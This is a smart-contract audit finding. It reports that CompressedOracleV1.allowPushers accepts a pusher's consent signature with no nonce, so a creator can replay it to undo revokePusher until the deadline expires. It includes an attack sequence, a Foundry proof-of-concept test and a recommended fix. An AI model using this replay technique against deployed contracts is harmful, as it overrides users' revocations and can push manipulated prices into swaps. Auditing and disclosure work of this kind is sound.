### Title
Creator can replay pusher's consent signature to nullify `revokePusher` within the deadline window — (`CompressedOracle.sol::allowPushers`)

---

### Summary

`CompressedOracleV1.allowPushers` accepts a pusher's EIP-191 consent signature that is bound to a `deadline` but carries no nonce and is never marked as consumed. After a pusher calls `revokePusher()` to clear their delegation, the creator can immediately call `allowPushers` again with the **identical** `(deadline, pusher, signature)` tuple to restore `namespaceRemapping[pusher] = creator`. This can be repeated on every block until the deadline expires, making `revokePusher` a no-op within the deadline window.

---

### Finding Description

`allowPushers` hashes `(chainid, address(this), deadline, pusher, msg.sender)` and recovers the pusher's address from the signature: [1](#0-0) 

The only freshness gate is `_ensureDeadline(deadline)`: [2](#0-1) 

`revokePusher` only clears `namespaceRemapping[msg.sender]`; it does not invalidate the signature, increment a nonce, or record the signature hash as spent: [3](#0-2) 

The code comment on `allowPushers` explicitly acknowledges the partial mitigation: *"an undated signature could re-establish a delegation AFTER the pusher revoked it"* — but the deadline only bounds the replay window; it does not prevent replay within that window: [4](#0-3) 

**Attack sequence:**

1. Pusher signs consent with `deadline = T + 30 days`.
2. Creator calls `allowPushers(deadline, [pusher], [sig])` → `namespaceRemapping[pusher] = creator`.
3. Pusher detects their data feed is compromised and calls `revokePusher()` → `namespaceRemapping[pusher] = address(0)`.
4. Creator calls `allowPushers(deadline, [pusher], [sig])` again with the **same** signature → `namespaceRemapping[pusher] = creator` restored.
5. Steps 3–4 can repeat indefinitely until `deadline` expires.

The pusher's fallback pushes continue to land in the creator's namespace: [5](#0-4) 

That namespace is the source for `CompressedOracleV1.price()`, which is consumed by `AnchoredPriceProvider._readLeg` and ultimately by `MetricOmmPool.swap`: [6](#0-5) 

---

### Impact Explanation

If the pusher's data feed becomes compromised or stale and the pusher tries to stop by revoking, the creator can keep re-establishing the delegation. The pusher's bad or stale data continues to flow into the creator's namespace. `AnchoredPriceProvider._isStale` will eventually reject it once `MAX_REF_STALENESS` elapses, but within that window, manipulated bid/ask quotes reach live pool swaps, causing swap conservation failure (traders receive more than the oracle permits or the pool fails to receive owed input). This matches the **bad-price execution** and **broken core pool functionality** impact gates.

---

### Likelihood Explanation

Medium. The creator must actively monitor the chain for `PusherRevoked` events and front-run or immediately follow with a replay call. This is trivially automatable with a bot. The pusher must have signed a consent with a non-trivial deadline (common in production deployments where long-lived delegations are expected). No privileged role is required — the creator is a normal unprivileged actor.

---

### Recommendation

Track consumed signatures with a per-pusher nonce or a `mapping(bytes32 => bool) usedConsentHashes` that marks each `(chainid, oracle, deadline, pusher, creator)` digest as spent on first use:

```solidity
mapping(bytes32 => bool) private _usedConsents;

// inside allowPushers loop:
bytes32 hash = MessageHashUtils.toEthSignedMessageHash(
    keccak256(abi.encode(block.chainid, address(this), deadline, pusher, msg.sender))
);
require(!_usedConsents[hash], "consent already used");
require(pusher == ECDSA.recover(hash, signatures[i]));
_usedConsents[hash] = true;
```

Alternatively, add a per-pusher revocation nonce that is incremented by `revokePusher` and included in the signed message, so any pre-signed consent is automatically invalidated on revocation.

### Proof of Concept

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.28;

import {Test} from "forge-std/Test.sol";
import {CompressedOracleV1} from "contracts/oracles/compressed/CompressedOracle.sol";
import {MessageHashUtils} from "@openzeppelin/contracts/utils/cryptography/MessageHashUtils.sol";

contract ReplayRevokeTest is Test {
    CompressedOracleV1 oracle;
    uint256 constant PUSHER_KEY = 0xBEEF;
    address pusher;
    address creator = address(0xC0FFEE);

    function setUp() public {
        vm.warp(1_700_000_000);
        oracle = new CompressedOracleV1(address(this), 60);
        pusher = vm.addr(PUSHER_KEY);
    }

    function testRevokeIsNullifiedByReplay() public {
        uint256 deadline = block.timestamp + 30 days;

        // Pusher signs consent once
        bytes32 digest = MessageHashUtils.toEthSignedMessageHash(
            keccak256(abi.encode(block.chainid, address(oracle), deadline, pusher, creator))
        );
        (uint8 v, bytes32 r, bytes32 s) = vm.sign(PUSHER_KEY, digest);
        bytes memory sig = abi.encodePacked(r, s, v);

        address[] memory pushers = new address[](1);
        pushers[0] = pusher;
        bytes[] memory sigs = new bytes[](1);
        sigs[0] = sig;

        // Creator establishes delegation
        vm.prank(creator);
        oracle.allowPushers(deadline, pushers, sigs);
        assertEq(oracle.namespaceRemapping(pusher), creator);

        // Pusher revokes
        vm.prank(pusher);
        oracle.revokePusher();
        assertEq(oracle.namespaceRemapping(pusher), address(0));

        // Creator replays the SAME signature — revocation nullified
        vm.prank(creator);
        oracle.allowPushers(deadline, pushers, sigs);
        assertEq(oracle.namespaceRemapping(pusher), creator); // pusher is re-delegated
    }
}
```

```text
    /// @notice Delegates pusher wallets into the caller's namespace. The pusher's EIP-191
    ///         signature is REQUIRED — without it anyone could remap a foreign pusher
    ///         wallet into their own namespace and silently swallow its pushes. The
    ///         deadline is likewise required: the signed consent carries no timestamp of
    ///         its own, so an undated signature could re-establish a delegation AFTER the
    ///         pusher revoked it.
    function allowPushers(uint256 deadline, address[] calldata pushers, bytes[] memory signatures) external {
        _ensureDeadline(deadline);

        uint256 l = pushers.length;
        require(l == signatures.length);
        for (uint256 i; i < l; i++) {
            address pusher = pushers[i];

            if (pusher == msg.sender) {
                revert NoSelfRemapping();
            }

            bytes32 hash = MessageHashUtils.toEthSignedMessageHash(
                keccak256(abi.encode(block.chainid, address(this), deadline, pusher, msg.sender))
            );
            require(pusher == ECDSA.recover(hash, signatures[i]));

            namespaceRemapping[pusher] = msg.sender;
            emit PusherAuthorized(pusher, msg.sender);
        }
```
